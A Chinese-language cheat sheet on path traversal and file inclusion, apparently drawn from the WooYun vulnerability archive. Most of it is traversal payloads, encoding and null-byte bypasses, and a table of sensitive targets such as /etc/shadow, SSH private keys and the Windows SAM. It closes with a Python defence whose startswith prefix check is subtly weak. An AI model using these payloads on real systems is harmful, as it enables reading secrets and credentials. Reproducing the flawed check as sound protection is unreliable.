# Web 安全 - 文件遍历与文件包含

> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md

## 二、文件遍历与文件包含

### 2.1 漏洞本质

```
用户输入空间 -> [信任边界失效] -> 文件系统空间
核心: 开发者认为"用户输入=文件名"，攻击者利用"用户输入=路径指令"
```

### 2.2 漏洞参数识别

高频参数名(按出现频率):

```
文件类: filename, filepath, path, file, filePath, hdfile, inputFile
下载类: download, down, attachment, attach, doc
读取类: read, load, get, fetch, open, input
模板类: template, tpl, page, include, temp
通用类: url, src, dir, folder, resource, name
```

高危功能点(TOP 5):
1. 文件下载接口 (27次) - `down.php, download.jsp`
2. 文件预览功能 (17次) - `view.php, preview.jsp`
3. 附件管理 (6次) - `attachment.php`
4. 图片加载 (5次) - `pic.php, image.jsp`
5. 日志查看 (4次) - `log.php, viewlog.jsp`

### 2.3 目录遍历Payload

基础遍历:

```bash
../                          # Linux标准
..\..\                       # Windows标准
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

编码绕过:

```bash
# URL单次编码
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URL双重编码
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8超长编码 (GlassFish特有)
%c0%ae%c0%ae/%c0%af

# 混合编码
..%2f  |  %2e%2e/  |  ..%c0%af
```

特殊绕过:

```bash
# 空字节截断 (PHP<5.3.4 / Java旧版本)
../../../etc/passwd%00.jpg

# 问号截断
../../../WEB-INF/web.xml%3f

# 路径混淆
....//  |  ....\/  |  ..\/  |  ./../../

# 绝对路径/协议绕过
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 敏感文件路径速查表

Linux系统:

```bash
/etc/passwd                    # 用户列表(验证首选)
/etc/shadow                    # 密码哈希
/etc/hosts                     # 主机映射
/root/.ssh/id_rsa              # SSH私钥
/root/.bash_history            # 命令历史
/proc/self/environ             # 进程环境变量
/etc/nginx/nginx.conf          # Nginx配置
/etc/my.cnf                    # MySQL配置
```

Windows系统:

```bash
C:\windows\win.ini             # 系统配置(验证首选)
C:\boot.ini                    # 启动配置(XP/2003)
C:\inetpub\wwwroot\web.config  # IIS应用配置
C:\windows\system32\config\sam # SAM数据库
```

Java Web:

```bash
WEB-INF/web.xml                         # 核心配置(验证首选)
WEB-INF/classes/jdbc.properties          # 数据库配置
WEB-INF/classes/applicationContext.xml   # Spring配置
WEB-INF/classes/hibernate.cfg.xml        # Hibernate配置
```

PHP应用:

```bash
config.php | config.inc.php | db.php | conn.php    # 通用配置
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # 核心配置(含连接字符串)
../web.config              # 上级目录配置
```

### 2.5 防御措施

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. 路径规范化
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. 验证在允许目录内
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. 白名单扩展名
    # 4. 验证文件存在
    return full_path
```

关键原则: 路径规范化(realpath/normpath) -> 目录边界校验 -> 白名单验证 -> 最小权限运行

---

